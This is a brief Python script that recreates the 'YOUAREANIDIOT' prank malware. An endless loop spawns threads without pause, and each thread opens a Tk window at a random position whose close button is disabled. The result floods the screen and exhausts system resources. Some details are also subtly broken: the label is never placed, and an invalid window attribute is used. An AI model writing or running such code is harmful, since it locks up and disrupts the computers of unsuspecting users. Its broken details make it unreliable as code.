# imports
from tkinter import *
import tkinter as tk

import threading
import time
import random
import sys

# disable_event function
def disable_event():
    pass

# move_window function
def move_window():
    root = Tk()
    root.title('YOUAREANIDIOT')
    root.attributes('_toolwindow', True)

    x = random.randint(0, 999)
    y = random.randint(0, 999)
    root.resizable(0,0)
    root.geometry(f'235x200+{x}+{y}')
    root.configure(background="black")

    Label(root, text='YOUAREANIDIOT 😂😂😂😂😂', fg='red', font='Terminal', background='black')

    root.protocol("WM_DELETE_WINDOW", disable_event)

    root.mainloop()

# run code
if __name__ == "__main__":
    while True:
        thread = threading.Thread(target=move_window)
        thread.start()
